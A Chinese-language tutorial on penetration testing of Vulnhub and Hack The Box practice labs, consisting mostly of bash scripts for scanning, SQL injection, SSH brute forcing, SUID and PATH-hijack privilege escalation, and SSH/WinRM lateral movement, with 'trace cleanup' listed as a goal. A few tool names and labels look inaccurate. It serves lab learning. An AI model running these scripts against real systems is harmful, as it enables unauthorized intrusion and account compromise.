# Vulnhub/HTB靶场bash实战

## 概述

Vulnhub和Hack The Box（HTB）是渗透测试学习的重要平台。本文详细介绍使用bash工具链进行靶场渗透的完整流程，包括信息收集、漏洞利用、提权和横向移动。

## 核心理念

- **系统化流程**：遵循标准的渗透测试方法论
- **工具组合**：灵活运用各种bash工具
- **自动化提权**：使用脚本自动检测提权向量
- **痕迹清理**：操作完成后清理痕迹

---

## 1. 靶场渗透流程

### 1.1 信息收集

```bash
#!/usr/bin/env bash
# 靶场信息收集脚本

TARGET="$1"

echo "[*] === 信息收集: $TARGET ==="

# 端口扫描
echo "[*] 端口扫描..."
nmap -sC -sV -O -A "$TARGET" -oN /tmp/nmap_scan.txt

# 服务识别
echo "[*] 服务识别..."
for port in 21 22 25 80 443 8080 3306; do
    (echo "" | nc -w 3 "$TARGET" "$port" 2>/dev/null | head -1) &
done
wait

# 目录枚举
echo "[*] 目录枚举..."
gobuster dir -u "http://$TARGET" -w /usr/share/wordlists/dirb/common.txt -t 50 -o /tmp/dir_enum.txt

# 子域名枚举
echo "[*] 子域名枚举..."
subfinder -d "$TARGET" -o /tmp/subdomains.txt 2>/dev/null

echo "[+] 信息收集完成"
```

### 1.2 漏洞扫描

```bash
#!/usr/bin/env bash
# 漏洞扫描脚本

TARGET="$1"

echo "[*] === 漏洞扫描: $TARGET ==="

# Nmap漏洞扫描
echo "[*] Nmap漏洞扫描..."
nmap --script vuln "$TARGET" -oN /tmp/vuln_scan.txt

# nikto扫描
echo "[*] nikto扫描..."
nikto -h "http://$TARGET" -o /tmp/nikto_scan.txt

# SQLmap测试
echo "[*] SQLmap测试..."
sqlmap -u "http://$TARGET/page?id=1" --batch --risk=3 --level=5 --output-dir=/tmp/sqlmap/

echo "[+] 漏洞扫描完成"
```

---

## 2. bash工具链使用

### 2.1 网络工具

```bash
# 端口扫描
nmap -sC -sV -O TARGET

# 目录枚举
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt

# 子域名枚举
subfinder -d TARGET

# 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh

# 抓包分析
tcpdump -i eth0 -w capture.pcap

# DNS枚举
dnsenum TARGET
```

### 2.2 Web工具

```bash
# SQL注入
sqlmap -u "http://TARGET/page?id=1" --batch

# XSS检测
xsser -u "http://TARGET" --batch

# 目录扫描
dirb http://TARGET /usr/share/wordlists/dirb/common.txt

# 文件上传测试
upload-lhs -u http://TARGET/upload

# SSRF测试
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt
```

### 2.3 密码工具

```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Hydra暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh

# medusa
medusa -h TARGET -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
```

---

## 3. 自动化提权脚本

### 3.1 Linux提权检查

```bash
#!/usr/bin/env bash
# Linux提权检查脚本

echo "[*] === Linux 提权检查 ==="

# 检查内核版本
echo "[*] 内核版本:"
uname -a
cat /etc/issue

# 检查SUID文件
echo "[*] SUID文件:"
find / -perm -4000 -type f 2>/dev/null

# 检查可写目录
echo "[*] 可写目录:"
find / -writable -type d 2>/dev/null | head -20

# 检查sudo权限
echo "[*] sudo权限:"
sudo -l 2>/dev/null

# 检查cron任务
echo "[*] Cron任务:"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null

# 检查环境变量
echo "[*] 环境变量:"
env | grep -E "(PATH|LD_|BASH_ENV)"

# 检查网络连接
echo "[*] 网络连接:"
netstat -tulnp 2>/dev/null || ss -tulnp 2>/dev/null

# 检查已安装软件
echo "[*] 已安装软件:"
dpkg -l 2>/dev/null | grep -E "(sudo|vim|python|perl)" | head -20
```

### 3.2 自动提权脚本

```bash
#!/usr/bin/env bash
# 自动提权脚本

echo "[*] === 自动提权 ==="

# 1. 尝试SUID提权
echo "[*] 尝试SUID提权..."
find / -perm -4000 -type f 2>/dev/null | while read suid_file; do
    case "$suid_file" in
        *vim*) vim -c ':!/bin/sh' ;;
        *find*) find . -exec /bin/sh \; -quit ;;
        *bash*) bash -p ;;
        *python*) python -c 'import os; os.execl("/bin/sh", "sh", "-p")' ;;
        *perl*) perl -e 'exec "/bin/sh";;' ;;
    esac
done

# 2. 尝试sudo提权
echo "[*] 尝试sudo提权..."
if sudo -l 2>/dev/null | grep -q "NOPASSWD"; then
    sudo /bin/sh
fi

# 3. 尝试cron提权
echo "[*] 尝试cron提权..."
find /var/spool/cron -type f -exec cat {} \; 2>/dev/null

# 4. 尝试PATH劫持
echo "[*] 尝试PATH劫持..."
cat > /tmp/ls << 'EOF'
#!/bin/bash
/bin/sh
EOF
chmod +x /tmp/ls
export PATH="/tmp:$PATH"
ls

echo "[+] 提权尝试完成"
```

---

## 4. 横向移动脚本

### 4.1 内网扫描

```bash
#!/usr/bin/env bash
# 内网扫描脚本

NETWORK="${1:-192.168.1.0/24}"

echo "[*] === 内网扫描: $NETWORK ==="

# 主机发现
echo "[*] 主机发现..."
nmap -sn "$NETWORK" -oG /tmp/hosts.txt

# 端口扫描
echo "[*] 端口扫描..."
while read line; do
    ip=$(echo "$line" | grep -oP '\d+\.\d+\.\d+\.\d+')
    if [[ -n "$ip" ]]; then
        nmap -sC -sV -p 22,80,443,445,3389 "$ip" -oN "/tmp/scan_${ip}.txt" &
    fi
done < /tmp/hosts.txt
wait

echo "[+] 内网扫描完成"
```

### 4.2 SSH横向移动

```bash
#!/usr/bin/env bash
# SSH横向移动脚本

TARGET="$1"
USER="$2"
KEY="${3:-~/.ssh/id_rsa}"

echo "[*] === SSH横向移动: $TARGET ==="

# 使用密钥连接
ssh -i "$KEY" "${USER}@${TARGET}"

# 或使用密码
sshpass -p "password" ssh "${USER}@${TARGET}"

# 上传工具
scp -i "$KEY" /tmp/tool "${USER}@${TARGET}:/tmp/"

# 执行远程命令
ssh -i "$KEY" "${USER}@${TARGET}" "bash -c 'command'"
```

### 4.3 WinRM横向移动

```bash
#!/usr/bin/env bash
# WinRM横向移动脚本

TARGET="$1"
USER="$2"
PASS="$3"

echo "[*] === WinRM横向移动: $TARGET ==="

# 使用evil-winrm
evil-winrm -i "$TARGET" -u "$USER" -p "$PASS"

# 或使用 crackmapexec
crackmapexec winrm "$TARGET" -u "$USER" -p "$PASS" -x "whoami"
```

---

## 5. 综合渗透脚本

```bash
#!/usr/bin/env bash
# 综合渗透脚本

TARGET="$1"

echo "[*] === 综合渗透: $TARGET ==="

# 1. 信息收集
echo "[*] 信息收集..."
nmap -sC -sV -O "$TARGET" -oN /tmp/scan.txt

# 2. 漏洞扫描
echo "[*] 漏洞扫描..."
nmap --script vuln "$TARGET" -oN /tmp/vuln.txt

# 3. 目录枚举
echo "[*] 目录枚举..."
gobuster dir -u "http://$TARGET" -w /usr/share/wordlists/dirb/common.txt -t 50

# 4. SQL注入测试
echo "[*] SQL注入测试..."
sqlmap -u "http://$TARGET/page?id=1" --batch

# 5. 提权检查
echo "[*] 提权检查..."
find / -perm -4000 -type f 2>/dev/null
sudo -l 2>/dev/null

echo "[+] 渗透完成"
```

---

## 6. HTB靶场实战

### 6.1 HTB常用技巧

```bash
# HTB连接
# 1. 注册HTB账号
# 2. 下载VPN配置
# 3. 连接VPN
sudo openvpn lab.ovpn

# 4. 获取目标IP
# 在HTB平台查看

# 5. 开始渗透
nmap -sC -sV TARGET
```

### 6.2 HTB工具链

```bash
# 信息收集
enum4linux TARGET
smbclient -L //TARGET/
rpcclient -U '' TARGET

# Web漏洞
nikto -h http://TARGET
wpscan --url http://TARGET

# 密码破解
hashcat -m 0 hash.txt rockyou.txt
john --wordlist=rockyou.txt hash.txt

# 提权
linpeas.sh
linux-exploit-suggester.sh
```

---

## 总结

本文介绍了使用bash工具链进行Vulnhub/HTB靶场渗透的完整流程：信息收集、漏洞扫描、漏洞利用、自动化提权和横向移动。这些技术和脚本可以用于渗透测试学习和CTF竞赛。
